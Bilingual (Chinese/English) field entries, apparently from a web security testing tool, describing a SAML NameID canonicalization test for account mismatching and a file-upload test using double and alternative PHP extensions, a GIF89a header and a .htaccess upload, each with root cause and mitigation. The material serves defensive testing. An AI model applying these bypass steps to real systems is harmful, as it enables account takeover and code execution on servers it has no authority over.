overview.en: This payload covers SAML NameID canonicalization and identity binding, testing whether the server treats NameIDs differing by case, whitespace or encoding as distinct identities. Validation rewrites the NameID then re-signs and verifies across two steps, mapped to steps 1 and 2.

vulnerability.zh: 根因在于身份比对在规范化之前执行或规范化规则与 IdP 不一致：攻击者提交大小写或空白变体的 NameID 即可绕过账户匹配，把响应映射到其他账户。
vulnerability.en: The root cause is identity comparison performed before canonicalization or rules diverging from the IdP: a case- or whitespace-variant NameID can slip past account matching and map the response onto another account.

exploitation.zh: 第 1 步解码样例响应并用 xmlstarlet 把 NameID 改写为空白与大小写变体；第 2 步对改写后文档执行 xmlsec1 验证（预期失败），再结合 ACS 实测账户映射：变体命中他人账户即确认规范化缺陷，被拒绝或归并到同一账户则通过。成功判据以账户映射记录为准。占位符在全局变量菜单替换；全程使用合成身份。
exploitation.en: In step 1, decode the sample response and use xmlstarlet to rewrite the NameID into whitespace and case variants. In step 2, re-sign with the test key and submit to the ACS, observing account matching: a variant resolving to another account confirms the canonicalization flaw, while rejection or same-account mapping passes. Judge success by account-mapping records. Replace placeholders via the global variables menu; use synthetic identities throughout.

mitigation.zh: 在账户查找前按固定规则规范化 NameID（小写化、去空白、统一编码），并校验规范化后与 IdP 声明一致。修复后重放第 1、2 步，变体应映射到同一账户或被拒绝。
mitigation.en: Canonicalize NameID by fixed rules (lowercasing, whitespace trimming, unified encoding) before account lookup and verify consistency with the IdP claim. After the fix, replay steps 1 and 2: variants should map to the same account or be rejected.

overview.zh: 文件上传存储与处理器边界验证针对 multipart 上传的检测与存储一致性问题：文件名、声明 MIME、检测 MIME、内容结构与最终处理器映射是否保持一致。按正常文本、双扩展、替代扩展、GIF 头与 .htaccess 五类样例逐项验证。
overview.en: File-upload storage and handler boundary validation targets consistency between multipart upload checks and storage: do filename, declared MIME, detected MIME, content structure, and final handler mapping agree? It verifies five sample classes in turn—normal text, double extensions, alternative extensions, GIF headers, and .htaccess.

vulnerability.zh: 根因是上传策略只校验单一信号（扩展名、声明类型或文件头）而非完整解码内容，且存储位置与 Web 处理器映射未被隔离，被放行的危险扩展名或配置文件最终落入可执行上下文。
vulnerability.en: The root cause is an upload policy validating a single signal (extension, declared type, or file header) instead of fully decoded content, combined with storage and web-handler mapping that are not isolated, so admitted dangerous extensions or config files land in an executable context.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步上传 text/plain 基线确认按 .txt 存储；第 2 步上传 marker.jpg.php 观察拒绝与原因；第 3 步逐个上传 .phtml/.PHp/.php5/php. 对照存储名与可执行标记；第 4 步验证 GIF89a 头识别口径；第 5 步上传 .htaccess 确认配置文件被拒。任一步接受并落入可执行处理器即边界失守，配合 Content-Type 与文件头伪装复测。
